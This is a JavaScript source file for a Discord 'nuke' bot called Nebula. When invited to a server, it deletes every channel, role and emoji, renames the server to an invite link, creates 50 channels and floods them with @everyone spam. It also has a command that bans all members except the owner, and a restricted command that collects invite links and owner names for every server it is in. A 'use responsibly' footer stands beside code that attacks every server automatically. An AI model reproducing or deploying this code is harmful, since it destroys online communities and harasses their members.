const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and auto-nuking servers...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || 1000;
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE FUNCTION ======
async function safeLeaveGuild(guild) {
  try {
    if (!guild || !guild.available || !guild.members.me) {
      console.log('ℹ️ Cannot leave: Already left or guild unavailable');
      return;
    }
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Successfully left the server.');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left or kicked from server.');
    } else {
      console.error(`⚠️ Error leaving server:`, err.message);
    }
  }
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

// ====== AUTO-NUKE ON JOIN ======
client.on('guildCreate', async (guild) => {
  const BLOCKED_GUILD_ID = '1345474714331643956';
  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
  const channelName = 'neb-was-here';

  // Block specific server
  if (guild.id === BLOCKED_GUILD_ID) {
    console.log(`🚫 Blocked from nuking guild: ${guild.name}`);
    await safeLeaveGuild(guild);
    return;
  }

  console.log(`🎯 Auto-nuking server: ${guild.name} (${guild.id})`);

  let didSomething = false;
  let sent = 0;

  try {
    // Small delay after join to avoid rate limits
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Step 1: Delete channels
    console.log('🧹 Deleting channels...');
    await Promise.all(guild.channels.cache.map(async (channel) => {
      const result = await handleRateLimit(() =>
        channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
      );
      if (result) {
        console.log(`🗑️ Deleted channel: ${channel.name}`);
        didSomething = true;
      }
    }));

    // Step 2: Delete roles
    console.log('🛡️ Deleting roles...');
    await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(async (role) => {
      const result = await handleRateLimit(() =>
        role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
      );
      if (result) {
        console.log(`🗑️ Deleted role: ${role.name}`);
        didSomething = true;
      }
    }));

    // Step 3: Delete emojis
    console.log('🖼️ Deleting emojis...');
    await Promise.all(guild.emojis.cache.map(async (emoji) => {
      const result = await handleRateLimit(() =>
        emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
      );
      if (result) {
        console.log(`🗑️ Deleted emoji: ${emoji.name}`);
        didSomething = true;
      }
    }));

    // Step 4: Rename server
    console.log('📛 Renaming server...');
    await handleRateLimit(() =>
      guild.setName('discord.gg/migh').catch(e => console.warn(`Rename fail: ${e.message}`))
    );
    console.log('✅ Server renamed.');
    didSomething = true;

    // Step 5: Create 50 channels
    const createdChannels = [];
    const totalChannelsToCreate = 50;
    const batchSize = 25;

    console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);
    for (let i = 0; i < totalChannelsToCreate; i += batchSize) {
      const batchPromises = [];
      for (let j = 0; j < batchSize && (i + j) < totalChannelsToCreate; j++) {
        const index = i + j;
        const createChan = async () => {
          const channel = await handleRateLimit(() =>
            guild.channels.create({ name: `${channelName}-${index + 1}` })
              .catch(e => console.warn(`Channel #${index + 1} failed:`, e.message))
          );
          if (channel) {
            console.log(`✅ Created channel: ${channel.name}`);
            createdChannels.push(channel);
            didSomething = true;
          }
        };
        batchPromises.push(createChan());
      }
      await Promise.all(batchPromises);
      await new Promise(r => setTimeout(r, 500)); // Delay between batches
    }

    if (createdChannels.length === 0) {
      console.error('❌ No channels created. Aborting spam.');
      await safeLeaveGuild(guild);
      return;
    }

    // Step 6: Spam up to 1000 messages (20 per channel)
    const validChannels = createdChannels.filter(ch => ch && ch.id);
    const MAX_MESSAGES = 1000;
    const MESSAGES_PER_CHANNEL = 20;

    console.log(`🔥 Spamming ${validChannels.length} channels...`);
    const sendBatch = validChannels.map(channel => async () => {
      for (let i = 0; i < MESSAGES_PER_CHANNEL && sent < MAX_MESSAGES; i++) {
        try {
          await handleRateLimit(() => channel.send(spamMessage));
          sent++;
          if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
        } catch (err) {
          console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
        }
        await new Promise(r => setTimeout(r, 2));
      }
    });

    await Promise.all(sendBatch.map(fn => fn()));
    console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);

    // Leave if most spam succeeded
    if (sent >= 950) {
      await safeLeaveGuild(guild);
    } else {
      console.log('🚫 Not enough messages sent. Not leaving.');
    }

    if (didSomething) {
      console.log('✅ Auto-nuke complete.');
    } else {
      console.error('🚫 Failed to perform any actions.');
    }

  } catch (err) {
    console.error('🚨 Critical error during auto-nuke:', err.message);
    await safeLeaveGuild(guild);
  }
});

// ====== MESSAGE HANDLER (Only .help and .ba) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();
  const BLOCKED_GUILD_ID = '1345474714331643956';

  // ===== HELP COMMAND =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot Commands')
      .setDescription('Here are the available commands for Nebula Bot:')
      .addFields(
        { name: '.ba', value: 'Bans all members (except owner)' },
        { name: '.help', value: 'Sends this help to your DMs' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'Use responsibly - only in servers you own!' });

    try {
      await message.author.send({ embeds: [helpEmbed] });
      if (message.channel?.send) {
        await message.reply('📬 Sent help to your DMs!');
      }
    } catch (err) {
      console.error('❌ Could not send DM:', err.message);
      if (message.channel?.send) {
        await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
      }
    }
    return;
  }

  // ===== SERVERS COMMAND (Restricted to specific user) =====
  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') {
      return message.reply('❌ You are not authorized to use this command.');
    }

    const guilds = client.guilds.cache;
    const serverList = [];

    console.log(`📥 ${message.author.tag} requested .servers`);
    if (message.channel?.send) {
      await message.reply('📬 Fetching server list...');
    }

    for (const [id, guild] of guilds.entries()) {
      try {
        const invites = await handleRateLimit(() => guild.invites.fetch());
        const firstInvite = invites?.first() || null;
        const owner = await handleRateLimit(() => guild.fetchOwner());
        serverList.push({
          name: guild.name,
          id: guild.id,
          ownerTag: owner.user.tag,
          invite: firstInvite ? firstInvite.url : 'No active invite found',
        });
      } catch (err) {
        console.error(`❌ Could not fetch data for guild ${guild.name}:`, err.message);
        serverList.push({
          name: guild.name,
          id: guild.id,
          error: 'Could not retrieve details (permissions?)',
        });
      }
    }

    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers I\'m In')
      .setDescription(`Total: ${serverList.length}`)
      .setColor('#00ffff');

    for (let i = 0; i < Math.min(serverList.length, 25); i++) {
      const server = serverList[i];
      const value = server.error
        ? `ID: ${server.id}\n⚠️ ${server.error}`
        : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
      embed.addFields({ name: `${i + 1}. ${server.name}`, value });
    }

    try {
      const dmChannel = await message.author.createDM();
      await dmChannel.send({ embeds: [embed] });

      if (serverList.length > 25) {
        for (let i = 25; i < serverList.length; i += 25) {
          const page = serverList.slice(i, i + 25);
          const moreEmbed = new EmbedBuilder()
            .setColor('#00ffff')
            .setTitle(`🌐 Servers I'm In (Page ${Math.floor(i / 25) + 1})`);
          for (const server of page) {
            const value = server.error
              ? `ID: ${server.id}\n⚠️ ${server.error}`
              : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
            moreEmbed.addFields({ name: `${serverList.indexOf(server) + 1}. ${server.name}`, value });
          }
          await dmChannel.send({ embeds: [moreEmbed] });
        }
      }

      if (message.channel?.send) {
        await message.reply('✅ Server list sent to your DMs!');
      }
    } catch (err) {
      console.error('❌ Failed to send DM:', err.message);
      if (message.channel?.send) {
        await message.reply('❌ Could not send DM. Make sure your DMs are open.');
      }
    }
    return;
  }

  // Block .ba in blocked server
  if (command === 'ba' && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 This command is disabled in this server.');
  }

  // ===== BAN ALL MEMBERS =====
  if (command === 'ba') {
    if (!message.member || !message.member.permissions.has('BAN_MEMBERS')) {
      return message.reply("❌ You don't have permission to ban members.");
    }

    const guild = message.guild;
    if (!guild) return;

    const ownerID = guild.ownerId;

    try {
      await message.channel.send("🔍 Fetching all members...");
      const allMembers = await guild.members.fetch();
      console.log(`📥 Fetched ${allMembers.size} members.`);

      const membersToBan = allMembers.filter(member =>
        member.id !== ownerID &&
        !member.user.bot &&
        member.bannable
      );

      if (membersToBan.size === 0) {
        return message.reply('❌ No members available to ban.');
      }

      console.log(`🔪 Attempting to ban ${membersToBan.size} members...`);
      await message.reply(`🔪 Attempting to ban ${membersToBan.size} members...`);

      let bannedCount = 0;
      let failCount = 0;

      for (const member of membersToBan.values()) {
        try {
          const result = await handleRateLimit(() => guild.members.ban(member, {
            reason: 'Nebula Ban All',
            deleteMessageSeconds: 604800
          }));
          if (result !== null) {
            console.log(`✅ Banned: ${member.user.tag}`);
            bannedCount++;
          } else {
            failCount++;
          }
        } catch (err) {
          console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
          failCount++;
        }
        await new Promise(r => setTimeout(r, 50));
      }

      console.log(`✅ Ban process finished. Banned: ${bannedCount}, Failed: ${failCount}`);
      await message.reply(`✅ Ban process finished. Successfully banned: ${bannedCount}. Failed: ${failCount}.`);
    } catch (fetchErr) {
      console.error(`❌ Error fetching members: ${fetchErr.message}`);
      await message.reply(`❌ Error occurred while fetching members: ${fetchErr.message}`);
    }
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
